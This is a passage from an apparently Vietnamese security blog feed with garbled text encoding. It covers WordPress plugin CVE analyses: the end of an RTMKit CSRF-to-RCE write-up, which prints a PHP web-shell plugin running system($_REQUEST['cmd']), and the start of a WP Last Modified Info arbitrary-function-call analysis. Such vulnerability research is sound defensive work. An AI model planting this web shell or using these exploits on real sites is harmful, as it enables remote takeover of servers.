&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Khi Administrator truy c·∫≠p l·∫ßn 2, plugin s·∫Ω ƒë∆∞·ª£c active&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;V√≠ d·ª• plugin:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!defined(&amp;#39;ABSPATH&amp;#39;)) {&#xA;    exit;&#xA;}&#xA;&#xA;add_action(&amp;#39;init&amp;#39;, function () {&#xA;    if (isset($_REQUEST[&amp;#39;cmd&amp;#39;])) {&#xA;        system($_REQUEST[&amp;#39;cmd&amp;#39;]);&#xA;    }&#xA;});&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-03-cve-2025-30911/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-12-03-cve-2025-30911/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-03-cve-2025-30911/result.png&#39; alt=&#34;Result&#34; height=&#34;813&#34; width=&#34;1249&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong &lt;strong&gt;RTMKit &amp;lt;= 1.5.4&lt;/strong&gt; n·∫±m ·ªü &lt;code&gt;install_requirements()&lt;/code&gt;, khi h√†m n√†y x·ª≠ l√Ω tr·ª±c ti·∫øp gi√° tr·ªã &lt;code&gt;$_POST[&#39;plugin&#39;]&lt;/code&gt; ƒë·ªÉ c√†i ƒë·∫∑t v√† k√≠ch ho·∫°t plugin m√† thi·∫øu ki·ªÉm so√°t ƒë·∫ßy ƒë·ªß. Phi√™n b·∫£n &lt;strong&gt;1.5.4&lt;/strong&gt; ƒë√£ th√™m ki·ªÉm tra quy·ªÅn v·ªõi &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; nh∆∞ng v·∫´n thi·∫øu b·∫£o v·ªá &lt;strong&gt;CSRF&lt;/strong&gt;, cho ph√©p attacker l·ª£i d·ª•ng &lt;strong&gt;Administrator&lt;/strong&gt; ƒëang ƒëƒÉng nh·∫≠p ƒë·ªÉ g·ª≠i request ng·∫ßm v√† c√†i plugin ƒë·ªôc h·∫°i. Ch·ªâ ƒë·∫øn &lt;strong&gt;v1.5.5&lt;/strong&gt;, vi·ªác k·∫øt h·ª£p th√™m &lt;code&gt;wp_verify_nonce()&lt;/code&gt; m·ªõi v√° k√≠n l·ªó h·ªïng v√† ch·∫∑n ƒë∆∞·ª£c nguy c∆° &lt;strong&gt;RCE&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n ki·ªÉm tra quy·ªÅn v√† &lt;strong&gt;nonce&lt;/strong&gt; cho m·ªçi AJAX endpoint.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng x·ª≠ l√Ω tr·ª±c ti·∫øp input ng∆∞·ªùi d√πng v·ªõi c√°c h√†nh ƒë·ªông nh·∫°y c·∫£m nh∆∞ c√†i/k√≠ch ho·∫°t plugin.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra quy·ªÅn th√¥i l√† ch∆∞a ƒë·ªß, ph·∫£i c√≥ ch·ªëng &lt;strong&gt;CSRF&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-romethemekit-for-elementor-plugin-1-5-4-arbitrary-plugin-installation-activation-to-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin &amp;lt;= 1.5.4 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-52756 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-02-cve-2025-52756/</link>
      <pubDate>Tue, 02 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-02-cve-2025-52756/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; trong plugin Sayan Datta &lt;strong&gt;WP Last Modified Info (wp-last-modified-info)&lt;/strong&gt; cho ph√©p &lt;strong&gt;Remote Code Inclusion&lt;/strong&gt;. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;WP Last Modified Info&lt;/strong&gt; t·ª´ &lt;strong&gt;n/a&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;&amp;lt;= 1.9.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52756&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52756&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-last-modified-info/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Last Modified Info Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WP Last Modified Info&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.9.4&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.9.5&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v1.9.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function render( $atts ) {&#xA;    $post = get_post();&#xA;    if ( ! $post instanceof \WP_Post ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if ( ! $this-&amp;gt;is_enabled( &amp;#39;enable_last_modified_cb&amp;#39; ) ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $author_id = $this-&amp;gt;get_meta( $post-&amp;gt;ID, &amp;#39;_edit_last&amp;#39; );&#xA;    if ( $this-&amp;gt;is_equal( &amp;#39;show_author_cb&amp;#39;, &amp;#39;custom&amp;#39;, &amp;#39;default&amp;#39; ) ) {&#xA;        $author_id = $this-&amp;gt;get_data( &amp;#39;lmt_show_author_list&amp;#39; );&#xA;    }&#xA;    &#xA;    $default_format = get_option( &amp;#39;date_format&amp;#39; );&#xA;    $atts = shortcode_atts( [&#xA;        &amp;#39;id&amp;#39;           =&amp;gt; $post-&amp;gt;ID,&#xA;        &amp;#39;template&amp;#39;     =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_last_modified_info_template&amp;#39; ),&#xA;        &amp;#39;date_format&amp;#39;  =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_date_time_format&amp;#39;, $default_format ),&#xA;        &amp;#39;date_type&amp;#39;    =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_last_modified_format_post&amp;#39;, &amp;#39;default&amp;#39; ),&#xA;        &amp;#39;schema&amp;#39;       =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_enable_jsonld_markup_cb&amp;#39;, &amp;#39;disable&amp;#39; ),&#xA;        &amp;#39;author_id&amp;#39;    =&amp;gt; (int) $author_id,&#xA;        &amp;#39;hide_archive&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;filter_ids&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;gap&amp;#39;          =&amp;gt; (int) $this-&amp;gt;get_data( &amp;#39;lmt_gap_on_post&amp;#39;, 0 ),&#xA;    ], $atts, &amp;#39;lmt-post-modified-info&amp;#39; );&#xA;&#xA;    $_post = get_post( absint( $atts[&amp;#39;id&amp;#39;] ) );&#xA;    if ( ! $_post ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if ( $atts[&amp;#39;hide_archive&amp;#39;] !== &amp;#39;&amp;#39; ) {&#xA;        foreach ( array_map( &amp;#39;trim&amp;#39;, explode( &amp;#39;,&amp;#39;, $atts[&amp;#39;hide_archive&amp;#39;] ) ) as $callback ) {&#xA;            if ( is_callable( $callback ) &amp;amp;&amp;amp; $callback() ) {&#xA;                return &amp;#39;&amp;#39;;&#xA;            }&#xA;        }&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;render()&lt;/code&gt; c·ªßa shortcode cho ph√©p nh·∫≠n thu·ªôc t√≠nh &lt;code&gt;$atts[&#39;hide_archive&#39;]&lt;/code&gt; t·ª´ ng∆∞·ªùi d√πng. Gi√° tr·ªã n√†y l√† m·ªôt chu·ªói ch·ª©a &lt;strong&gt;danh s√°ch c√°c t√™n h√†m&lt;/strong&gt;, ƒë∆∞·ª£c ngƒÉn c√°ch b·ªüi d·∫•u ph·∫©y (&lt;code&gt;,&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;V√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$atts[&amp;#39;hide_archive&amp;#39;] = &amp;#34;a,b,c&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒë√≥:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;explode(&amp;#39;,&amp;#39;, $atts[&amp;#39;hide_archive&amp;#39;]) &#xA;‚Üí [&amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;c&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi t√°ch chu·ªói b·∫±ng &lt;code&gt;explode()&lt;/code&gt;, ƒëo·∫°n code d√πng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;array_map(&amp;#39;trim&amp;#39;, ...)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒë·ªÉ &lt;strong&gt;xo√° kho·∫£ng tr·∫Øng th·ª´a&lt;/strong&gt; ·ªü ƒë·∫ßu/ng∆∞·ªùi m·ªói ph·∫ßn t·ª≠, ƒë·∫£m b·∫£o t√™n h√†m ‚Äús·∫°ch‚Äù tr∆∞·ªõc khi x·ª≠ l√Ω. K·∫øt qu·∫£ v·∫´n l√† m·ªôt m·∫£ng c√°c chu·ªói, nh∆∞ng ƒë√£ ƒë∆∞·ª£c chu·∫©n ho√°:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[&amp;#34; a &amp;#34;, &amp;#34; b &amp;#34;, &amp;#34; c &amp;#34;] ‚Üí [&amp;#34;a&amp;#34;, &amp;#34;b&amp;#34;, &amp;#34;c&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·∫øp theo, v√≤ng l·∫∑p &lt;code&gt;foreach&lt;/code&gt; duy·ªát t·ª´ng ph·∫ßn t·ª≠ v√† g√°n v√†o bi·∫øn &lt;code&gt;$callback&lt;/code&gt;. T·∫°i ƒë√¢y, &lt;code&gt;$callback&lt;/code&gt; ch√≠nh l√† &lt;strong&gt;t√™n m·ªôt h√†m d∆∞·ªõi d·∫°ng chu·ªói&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( ... as $callback ) &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi m·ªói &lt;code&gt;$callback&lt;/code&gt;, code ki·ªÉm tra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;is_callable( $callback )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†:&#xA;üëâ T√™n h√†m n√†y &lt;strong&gt;c√≥ t·ªìn t·∫°i v√† c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c hay kh√¥ng&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu ƒë√∫ng, ƒëo·∫°n code ti·∫øp t·ª•c g·ªçi tr·ª±c ti·∫øp h√†m ƒë√≥:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callback()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kh√¥ng c√≥ tham s·ªë n√†o ƒë∆∞·ª£c truy·ªÅn v√†o. N·∫øu h√†m ƒë∆∞·ª£c g·ªçi tr·∫£ v·ªÅ &lt;code&gt;true&lt;/code&gt; th√¨ plugin s·∫Ω:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return &amp;#39;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;v√† &lt;strong&gt;kh√¥ng hi·ªÉn th·ªã b·∫•t k·ª≥ n·ªôi dung n√†o c·ªßa shortcode&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v1.9.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-02-cve-2025-52756/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-02-cve-2025-52756/diff.png&#39; alt=&#34;Diff&#34; height=&#34;149&#34; width=&#34;1833&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ d√πng whitelist cho c√°c function =&amp;gt; Tr√°nh g·ªçi h√†m tu·ª≥ √Ω.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Shortcode extends PostView {&#xA;    ...&#xA;    if ( in_array( $archive, $this-&amp;gt;functions, true ) &amp;amp;&amp;amp; is_callable( $archive ) &amp;amp;&amp;amp; $archive() ) {&#xA;        return $content;&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;class PostView {&#xA;    protected $functions = [&#xA;        &amp;#39;is_archive&amp;#39;,&#xA;        &amp;#39;is_tax&amp;#39;,&#xA;        &amp;#39;is_home&amp;#39;,&#xA;        &amp;#39;is_front_page&amp;#39;,&#xA;        &amp;#39;is_search&amp;#39;,&#xA;        &amp;#39;is_404&amp;#39;,&#xA;        &amp;#39;is_author&amp;#39;,&#xA;        &amp;#39;is_category&amp;#39;,&#xA;        &amp;#39;is_tag&amp;#39;,&#xA;    ];&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V√¨ class &lt;code&gt;ShortCode&lt;/code&gt; k·∫ø th·ª´a &lt;code&gt;PostView&lt;/code&gt; n√™n c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c &lt;code&gt;$functions&lt;/code&gt; c·ªßa l·ªõp cha.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt shortcode b·∫±ng d√≤ng l·ªánh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_shortcode( &amp;#39;lmt-post-modified-info&amp;#39;, [ $this, &amp;#39;render&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†:&#xA;khi WordPress g·∫∑p shortcode c√≥ tag &lt;strong&gt;&lt;code&gt;lmt-post-modified-info&lt;/code&gt;&lt;/strong&gt; trong n·ªôi dung b√†i vi·∫øt (ho·∫∑c khi b√†i vi·∫øt ƒë∆∞·ª£c hi·ªÉn th·ªã v√† c√≥ ch·ª©a shortcode n√†y), WordPress s·∫Ω &lt;strong&gt;g·ªçi ph∆∞∆°ng th·ª©c &lt;code&gt;render()&lt;/code&gt; c·ªßa class hi·ªán t·∫°i&lt;/strong&gt; ƒë·ªÉ x·ª≠ l√Ω v√† tr·∫£ v·ªÅ n·ªôi dung t∆∞∆°ng ·ª©ng.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ c√°c logic c·ªßa render 